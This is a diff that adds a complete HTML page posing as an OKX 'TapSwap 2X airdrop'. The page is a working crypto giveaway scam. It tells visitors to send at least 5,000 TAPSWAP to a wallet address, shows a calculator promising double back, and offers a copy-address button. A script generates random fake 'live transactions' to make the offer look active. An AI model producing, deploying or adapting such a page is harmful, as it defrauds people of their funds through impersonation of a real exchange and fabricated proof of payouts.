@@ -1,0 +1,782 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport"
+          content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
+    <title>OKX 2X AIRDROP EVENT</title>
+
+    <style>
+        @font-face {
+            font-family: 'HarmonyOS_Sans_Regular';
+            src: url('/clint/fonts/HarmonyOS_Sans_Regular.woff') format('woff');
+        }
+
+        /*@font-face {*/
+        /*    font-family: 'HarmonyOS_Sans_Medium';*/
+        /*    src: url('/clint/fonts/HarmonyOS_Sans_Medium.woff') format('woff');*/
+        /*}*/
+        @font-face {
+            font-family: 'HarmonyOS_Sans_Bold';
+            src: url('/clint/fonts/HarmonyOS_Sans_Bold.woff') format('woff');
+        }
+    </style>
+
+    <style>
+
+        html, body {
+            font-family: HarmonyOS_Sans_Regular;
+        }
+
+        button, h1, h2, h3, h4, h5, h6, b {
+            font-family: HarmonyOS_Sans_Bold;
+        }
+
+        button {
+            background: #ffffff;
+            box-shadow: none;
+            color: #000000;
+            width: 100%;
+            padding: 12px 20px;
+            border: 1px solid #757575;
+            border-radius: 24px;
+            font-size: 16px;
+            font-weight: 800;
+        }
+
+        .green {
+            color: #00ff00 !important;
+        }
+
+        .orange {
+            color: #FF9500 !important;
+        }
+
+        .gray {
+            color: #7f7f7f !important;
+        }
+
+        .blue {
+            color: #007bff !important
+        }
+
+        .larger{
+            font-size: larger;
+        }
+
+        body {
+            position: relative;
+            display: block;
+            background: #000;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+        }
+
+        header {
+            position: fixed;
+            top: 0;
+            right: 0;
+            left: 0;
+            height: 48px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #121212;
+            z-index: 10;
+        }
+
+        header > a {
+            position: relative;
+            display: flex;
+            align-items: center;
+            align-content: center;
+        }
+
+        header > a > img {
+            width: auto;
+            max-height: 36px;
+        }
+
+        footer {
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: #121212;
+            padding: 30px 20px;
+        }
+
+        footer > a {
+            position: relative;
+            display: flex;
+            align-items: center;
+            align-content: center;
+        }
+
+        footer > a > img {
+            width: auto;
+            max-height: 36px;
+        }
+
+        footer > .copyright {
+            font-size: 14px;
+            gap: 1rem;
+        }
+
+        .info-banner {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 2rem;
+            min-height: calc(100vh - 88px);
+            padding: 68px 20px 20px 20px;
+        }
+
+        .info-banner h2 {
+            position: relative;
+            display: flex;
+            font-size: 18px;
+            color: #7f7f7f;
+            font-weight: 700;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 1rem;
+        }
+
+        .info-banner h2 > b {
+            position: relative;
+            display: block;
+            font-size: 26px;
+            color: #fff;
+            font-weight: 700;
+        }
+
+        .info-banner > img.logo {
+            width: 140px;
+            border: 2px solid #FFF;
+            border-radius: 100%;
+            aspect-ratio: 1/1;
+        }
+
+        .info-banner > h4 {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            color: #fff;
+            align-items: center;
+            justify-content: center;
+            gap: 1rem;
+            font-weight: 700;
+            font-size: 20px;
+        }
+
+        .info-banner > h4 > b {
+            font-size: 26px;
+            font-weight: 700;
+        }
+
+        .info-banner button {
+
+        }
+
+        .text-banner {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 2rem;
+            padding: 60px 20px;
+            background: #1e1e1e;
+        }
+
+        .text-banner > h4 {
+            color: #fff;
+            font-weight: 700;
+            font-size: 24px;
+            line-height: 40px;
+            margin: 0;
+            text-align: center;
+        }
+
+        .text-banner > p {
+            text-align: center;
+            color: #fff;
+            font-size: 16px;
+            line-height: 32px;
+            margin: 0;
+        }
+
+        .event-banner {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 1rem;
+            padding: 60px 20px;
+        }
+
+        .event-banner > h4 {
+            color: #fff;
+            font-weight: 700;
+            font-size: 18px;
+            line-height: 34px;
+            margin: 0 0 1rem 0;
+            text-align: center;
+        }
+
+        .event-banner > p {
+            text-align: center;
+            color: #fff;
+            font-size: 16px;
+            line-height: 32px;
+            margin: 0;
+        }
+
+        .event-banner > .calculator {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+            align-items: center;
+            justify-content: space-between;
+            gap: 0;
+            margin-top: 2rem;
+        }
+
+        .event-banner > .calculator .in-out {
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .event-banner > .calculator .in-out > input {
+            border: 1px solid #fff;
+            border-radius: 8px;
+            height: 36px;
+            width: 100%;
+            color: #e4e4e4;
+            padding: 10px 5ch;
+            font-size: 18px;
+            text-align: center;
+            background: transparent;
+            font-family: HarmonyOS_Sans_Bold;
+        }
+
+        .event-banner > .calculator .in-out > span {
+            font-family: HarmonyOS_Sans_Bold;
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0 10px;
+            font-size: 16px;
+        }
+
+        .event-banner > .calculator .in-out > span:first-child {
+            left: 0;
+        }
+
+        .event-banner > .calculator .in-out > span:last-child {
+            right: 0;
+
+        }
+
+        .event-banner > .calculator .transform {
+            position: relative;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid #00ff00;
+            width: 30px;
+            aspect-ratio: 1;
+            border-radius: 50%;
+            box-shadow: 1px 1px 8px #00ff00,
+            -1px 1px 8px #00ff00,
+            1px -1px 8px #00ff00,
+            -1px -1px 8px #00ff00;
+        }
+
+        .event-banner > .calculator .transform svg {
+            fill: #fff;
+            position: relative;
+            display: flex;
+            width: 20px;
+            aspect-ratio: 1 / 1;
+        }
+
+        .trans-banner {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 2rem;
+            padding: 60px 20px;
+            background: #1e1e1e;
+        }
+
+        .trans-banner > h4 {
+            color: #fff;
+            font-weight: 700;
+            font-size: 24px;
+            line-height: 24px;
+            margin: 0;
+        }
+
+        .trans-banner > p {
+            color: #fff;
+            text-align: center;
+            font-size: 16px;
+            line-height: 32px;
+            margin: 0;
+        }
+
+        .trans-banner > p .reward {
+            font-size: 22px;
+            display: block;
+            line-height: 40px;
+            margin: 5px 0 0 0;
+        }
+
+        .trans-banner > .qr {
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0 40px;
+        }
+
+        .trans-banner > .qr > img {
+            border-radius: 15px;
+            overflow: hidden;
+            max-width: 80%;
+            height: auto;
+        }
+
+        .trans-banner > .address {
+            color: #fff;
+            text-align: center;
+            margin: 0;
+            background: transparent;
+            width: calc(100% - 40px);
+            box-shadow: none;
+            padding: 12px 20px;
+            border: 1px solid #757575;
+            border-radius: 24px;
+            font-size: 16px;
+            font-weight: 800;
+        }
+
+        .trans-banner > button {
+            width: 100%;
+            transition: all ease-in-out .125s;
+        }
+
+        .trans-banner > button.copied {
+            background: #007bff;
+            color: #fff;
+        }
+
+        .live-banner {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 4rem;
+            padding: 48px 20px;
+        }
+
+        .live-banner > h4 {
+            color: #fff;
+            font-weight: 700;
+            font-size: 24px;
+            line-height: 24px;
+            margin: 0;
+        }
+
+        .live-banner > p {
+            color: #fff;
+            text-align: center;
+            font-size: 16px;
+            line-height: 32px;
+            margin: 0;
+        }
+
+        .live-banner > #transactions {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+            align-items: stretch;
+            justify-content: center;
+            gap: 1rem;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        .live-banner > #transactions .transaction {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: stretch;
+            border: 1px solid #1e1e1e;
+            padding: 0;
+            border-radius: 8px;
+            overflow: hidden;
+            opacity: 1;
+            transform: scale(1);
+            transition: all ease-in-out .300s;
+            margin-left: 0;
+            margin-right: 0;
+        }
+
+        .live-banner > #transactions .transaction.hidden {
+            opacity: .5;
+            transform: scale(1);
+            margin-left: -100%;
+            margin-right: 100%;
+        }
+
+        .live-banner > #transactions .transaction > h3 {
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0;
+            font-size: 15px;
+            padding: 10px 5px;
+            overflow: hidden;
+            background: #1e1e1e;
+            color: #fff;
+        }
+
+        .live-banner > #transactions .transaction > p {
+            position: relative;
+            display: flex;
+            align-items: baseline;
+            justify-content: space-between;
+            margin: 0;
+            font-size: 12px;
+            line-height: 22px;
+            color: #757575;
+            padding: 0 10px;
+        }
+
+        .live-banner > #transactions .transaction > p:nth-last-child(1), .live-banner > #transactions .transaction > p:nth-last-child(2) {
+            color: #FF9500;
+        }
+
+        .live-banner > #transactions .transaction > p:nth-last-child(1) {
+            opacity: 0;
+            display: none;
+            visibility: hidden;
+        }
+
+        .live-banner > #transactions .transaction > p > span {
+            color: #0f0;
+            font-weight: 700;
+        }
+
+    </style>
+</head>
+<body>
+
+<header>
+    <a href="https://www.okx.com/">
+        <img
+            width="82"
+            height="36"
+            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAKQAAABICAQAAADSOpYzAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QA/4ePzL8AAAAJcEhZcwAAFiUAABYlAUlSJPAAAAAHdElNRQfmBwMNKhI4Vg/yAAABMklEQVR42u3aQW6DMBBAUZyT5eSFE/RInS5psOKx8Scq0n9ZNXjA+VE3VpZFkiRJkiShYo0rrYPPWyf3+3VYXZL138nTuudLxLVfVCmHrcXY+uqjteejPF7/XH5G1teXe+ebt1E/Q0IMCTEkxJAQQ0IMCTEkxJAQQ0IMCTEkxJCQ+4XcBq+Orj87n54oPlv3iWc2Xk3A55tzZs8rd+l55OT54PB5ZLrhMjd/2M3keeXufv/a/5QhIYaEGBJiSIghIYaEGBJiSIghIYaEGBJiSEgaMjtG+/B+tw/f8eVqlPq1X7xYlX5wfTXfPj/095Hv1tdfRPLJ/X3kvRkSYkiIISGGhBgSYkiIISGGhBgSYkiIISGGhDwuOOH7a+t4p//qmflticYrf946OS9JkiRJkk75BUgSur6QrNyYAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDIyLTA3LTAzVDEzOjQyOjE4KzAwOjAwKpbwNQAAACV0RVh0ZGF0ZTptb2RpZnkAMjAyMi0wNy0wM1QxMzo0MjoxOCswMDowMFvLSIkAAAAASUVORK5CYII="
+            alt="OKX - Leading Cryptocurrency Exchange"
+            title="OKX"
+        >
+    </a>
+</header>
+
+<main>
+
+    <div class="info-banner">
+
+        <h2>
+            <b class="orange">TAPSWAP X2</b>
+            <span>AIRDROP BY</span>
+            <b>OKX</b>
+        </h2>
+
+        <img class="logo"
+             src="https://i.imghippo.com/files/rsUSc1722702552.png"
+             alt="Claim X2 TapSwap on OKX">
+
+        <h4>
+            <span>UP TO</span>
+            <b class="green">100,000,000 TAPSWAP</b>
+            <span>GIVEAWAY BY OKX</span>
+        </h4>
+
+        <button type="button" class="move-to">Claim Now!</button>
+
+    </div>
+
+    <div class="text-banner">
+
+        <h4>The <span class="orange">TAPSWAP</span> <span class="green">2X</span> Airdrop</h4>
+
+        <p>Our platform officially lunched a <b>Giveaway</b> to appreciate the <b class="orange">TAPSWAP</b> holders.</p>
+        <p>Up tp <b class="green">$5,000,000</b> will be sent out to all of our lucky participants.</p>
+
+    </div>
+
+    <div class="event-banner">
+        <h4>About TapSwap Giveaway Event</h4>
+
+        <p>During this <b>unique event</b> we will give you a chance to win up to <b class="green">10,000,000 TAPSWAP</b>
+            and <b class="green">double</b> your <b class="orange">TAPSWAPS</b> as
+            easy as the clicks.</p>
+
+        <p>You can only participate in this airdrop <b>once</b> and the minimum amount to participate is
+            <br>
+            <b class="orange larger">5,000 TAPSWAP</b>
+        </p>
+
+        <p>Once we receive your transaction, we will immediately send the <b class="green larger">2X amount</b> back to you
+            automatically.</p>
+
+        <div class="calculator">
+            <div class="in-out">
+                <span class="gray">Send</span>
+                <input id="calculator" type="text" value="5000">
+                <span class="orange">TAPSWAP</span>
+            </div>
+
+            <div class="transform">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512">
+                    <path
+                        d="M529 377c9.4-9.4 9.4-24.6 0-33.9s-24.6-9.4-33.9 0l-55 55V56c0-13.3-10.7-24-24-24s-24 10.7-24 24V398.1l-55-55c-9.4-9.4-24.6-9.4-33.9 0s-9.4 24.6 0 33.9l96 96c9.4 9.4 24.6 9.4 33.9 0l96-96zM177 39c-9.4-9.4-24.6-9.4-33.9 0L47 135c-9.4 9.4-9.4 24.6 0 33.9s24.6 9.4 33.9 0l55-55V456c0 13.3 10.7 24 24 24s24-10.7 24-24V113.9l55 55c9.4 9.4 24.6 9.4 33.9 0s9.4-24.6 0-33.9L177 39z"/>
+                </svg>
+            </div>
+
+            <div class="in-out">
+                <span class="gray">Receive</span>
+                <input class="green" id="calculated" type="text" value="10,000" readonly disabled>
+                <span class="orange">TAPSWAP</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="trans-banner">
+
+        <h4>How To Claim</h4>
+
+        <p>Copy the TAPSWAP wallet address below<br>and send your wanted amount to it<br>and wait to receive your <br><b
+                class="green reward">2X Airdrop</b></p>
+
+        <div class="qr">
+            <img src="https://i.imghippo.com/files/JCKf11722709641.png" alt="QR Code" width="1125" height="1144">
+        </div>
+
+        <input class="address" value="UQBhzUnQUQ40mcTAOq7HajXpNaXSwMDrictjhWEcSspNUW-_">
+
+        <button id="walletAddress">
+            Copy TAPSWAP Wallet Address
+        </button>
+    </div>
+
+    <div class="live-banner">
+        <h4>LIVE TRANSACTIONS</h4>
+        <div id="transactions">
+            <!-- Initial transactions -->
+            <div class="transaction">
+                <h3>7exj66f5V4Jii3G42rnJ...</h3>
+                <p><span>Block</span> 88741</p>
+                <p><span>From</span> cYVVLTf2Fol4NCOMrrdg...</p>
+                <p><span>To</span> EQDn6G2gh0LtkzQ0_-uP...</p>
+                <p><span>Value</span> 33439.853 TAPSWAP</p>
+                <p><span>TxFee</span> 48.641 TAPSWAP</p>
+            </div>
+            <div class="transaction">
+                <h3>ZdhpNoNWUQzOqZRMKDVY...</h3>
+                <p><span>Block</span> 918156</p>
+                <p><span>From</span> hjBWynEUnczcF7tudRZr...</p>
+                <p><span>To</span> EQDn6G2gh0LtkzQ0_-uP...</p>
+                <p><span>Value</span> 43610.511 TAPSWAP</p>
+                <p><span>TxFee</span> 46.615 TAPSWAP</p>
+            </div>
+            <div class="transaction">
+                <h3>bzNJ8E3mK4DEHp6oq0uD...</h3>
+                <p><span>Block</span> 940963</p>
+                <p><span>From</span> 29gVruKawMWck7bYIHPq...</p>
+                <p><span>To</span> EQDn6G2gh0LtkzQ0_-uP...</p>
+                <p><span>Value</span> 29880.975 TAPSWAP</p>
+                <p><span>TxFee</span> 25.085 TAPSWAP</p>
+            </div>
+            <div class="transaction">
+                <h3>Qnq308o8IxUf7F7srIdE...</h3>
+                <p><span>Block</span> 1667</p>
+                <p><span>From</span> 1CghEnEQyYyRbou1HHhO...</p>
+                <p><span>To</span> EQDn6G2gh0LtkzQ0_-uP...</p>
+                <p><span>Value</span> 47515.050 TAPSWAP</p>
+                <p><span>TxFee</span> 41.287 TAPSWAP</p>
+            </div>
+            <div class="transaction">
+                <h3>LkR1JyG7eidqPxf7aVG5...</h3>
+                <p><span>Block</span> 239300</p>
+                <p><span>From</span> 4aBwBX3nzywiXAIU5hGa...</p>
+                <p><span>To</span> EQDn6G2gh0LtkzQ0_-uP...</p>
+                <p><span>Value</span> 47958.453 TAPSWAP</p>
+                <p><span>TxFee</span> 48.799 TAPSWAP</p>
+            </div>
+        </div>
+
+    </div>
+
+</main>
+
+<footer>
+
+    <a href="https://www.okx.com/">
+        <img
+            width="82"
+            height="36"
+            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAKQAAABICAQAAADSOpYzAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QA/4ePzL8AAAAJcEhZcwAAFiUAABYlAUlSJPAAAAAHdElNRQfmBwMNKhI4Vg/yAAABMklEQVR42u3aQW6DMBBAUZyT5eSFE/RInS5psOKx8Scq0n9ZNXjA+VE3VpZFkiRJkiShYo0rrYPPWyf3+3VYXZL138nTuudLxLVfVCmHrcXY+uqjteejPF7/XH5G1teXe+ebt1E/Q0IMCTEkxJAQQ0IMCTEkxJAQQ0IMCTEkxJCQ+4XcBq+Orj87n54oPlv3iWc2Xk3A55tzZs8rd+l55OT54PB5ZLrhMjd/2M3keeXufv/a/5QhIYaEGBJiSIghIYaEGBJiSIghIYaEGBJiSEgaMjtG+/B+tw/f8eVqlPq1X7xYlX5wfTXfPj/095Hv1tdfRPLJ/X3kvRkSYkiIISGGhBgSYkiIISGGhBgSYkiIISGGhDwuOOH7a+t4p//qmflticYrf946OS9JkiRJkk75BUgSur6QrNyYAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDIyLTA3LTAzVDEzOjQyOjE4KzAwOjAwKpbwNQAAACV0RVh0ZGF0ZTptb2RpZnkAMjAyMi0wNy0wM1QxMzo0MjoxOCswMDowMFvLSIkAAAAASUVORK5CYII="
+            alt="OKX - Leading Cryptocurrency Exchange"
+            title="OKX"
+        >
+    </a>
+
+    <div class="copyright"><span class="gray">©2017-2024</span> <b onclick="window.location.href = 'https://www.okx.com/'">OKX.COM</b></div>
+
+</footer>
+
+
+<script>
+    document.querySelectorAll('.move-to').forEach(button => {
+
+        button.addEventListener('click', event => {
+
+            document.querySelector('.trans-banner').scrollIntoView({behavior: "smooth"});
+
+        })
+
+    });
+
+    document.getElementById('calculator').addEventListener('input', event => {
+
+        let input = 0;
+
+        if (event.currentTarget.value !== '') {
+            input = parseInt(event.currentTarget.value);
+        }
+
+        document.getElementById('calculated').value = new Intl.NumberFormat().format(input * 2);
+    });
+
+    document.getElementById('walletAddress').addEventListener('click', async event => {
+
+        await navigator.clipboard.writeText('UQBhzUnQUQ40mcTAOq7HajXpNaXSwMDrictjhWEcSspNUW-_')
+            .then(() => {
+                event.target.classList.add('copied');
+                event.target.setAttribute('disabled', 'disabled');
+                event.target.innerText = 'Done!'
+            })
+            .finally(() => {
+                setTimeout(() => {
+                    event.target.classList.remove('copied');
+                    event.target.removeAttribute('disabled');
+                    event.target.innerText = 'Copy TAPSWAP Wallet Address'
+                }, 2500);
+            });
+    })
+</script>
+
+<script>
+    function generateRandomHash(length) {
+        var result = '';
+        var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        var charactersLength = characters.length;
+        for (var i = 0; i < length; i++) {
+            result += characters.charAt(Math.floor(Math.random() * charactersLength));
+        }
+        return result;
+    }
+
+    function generateRandomValue(min, max) {
+        return (Math.random() * (max - min) + min).toFixed(2);
+    }
+
+    function generateTransaction() {
+        var txHash = generateRandomHash(20) + "...";
+        var block = Math.floor(Math.random() * 1000000);
+        var from = generateRandomHash(20) + "...";
+        var to = "EQDn6G2gh0LtkzQ0_-uP...";
+        // var age = new Date().toLocaleTimeString();
+        var age = "Right Now";
+        var value = generateRandomValue(5000, 1000000);
+        var txFee = (value / 100 * 2.5).toFixed(2);
+
+        txFee = txFee > 1000 ? 1000 : txFee;
+
+        value = new Intl.NumberFormat().format(value)
+        txFee = new Intl.NumberFormat().format(txFee)
+
+        const transition = document.createElement('div');
+        transition.classList.add('transaction');
+        transition.classList.add('hidden');
+        transition.innerHTML = `
+                                          <h3>${txHash}</h3>
+                                          <p><span>Block</span> ${block}</p>
+                                          <p><span>From</span> ${from}</p>
+                                          <p><span>To</span> ${to}</p>
+                                          <p><span>Value</span> ${value} TAPSWAP</p>
+                                          <p><span>TxFee</span> ${txFee} TAPSWAP</p>
+                                        `;
+
+        return transition;
+    }
+
+    function randomIntFromInterval(min, max) { // min and max included
+        return Math.floor(Math.random() * (max - min + 1) + min);
+    }
+
+    function updateTransactions() {
+        var transactionsDiv = document.getElementById('transactions');
+        transactionsDiv.prepend(generateTransaction())
+
+        var transactions = transactionsDiv.getElementsByClassName('transaction');
+        if (transactions.length > 5) {
+            transactionsDiv.removeChild(transactions[5]);
+        }
+
+        let hiddens = document.querySelectorAll('.transaction.hidden');
+
+        if (hiddens.length) {
+
+            hiddens.forEach(hidden => {
+                setTimeout(() => {
+                    hidden.classList.remove('hidden')
+                }, 100);
+            })
+        }
+
+        setTimeout(() => {
+
+            updateTransactions()
+
+        }, randomIntFromInterval(250, 3500));
+    }
+
+    updateTransactions();
+</script>
+
+</body>
+</html>
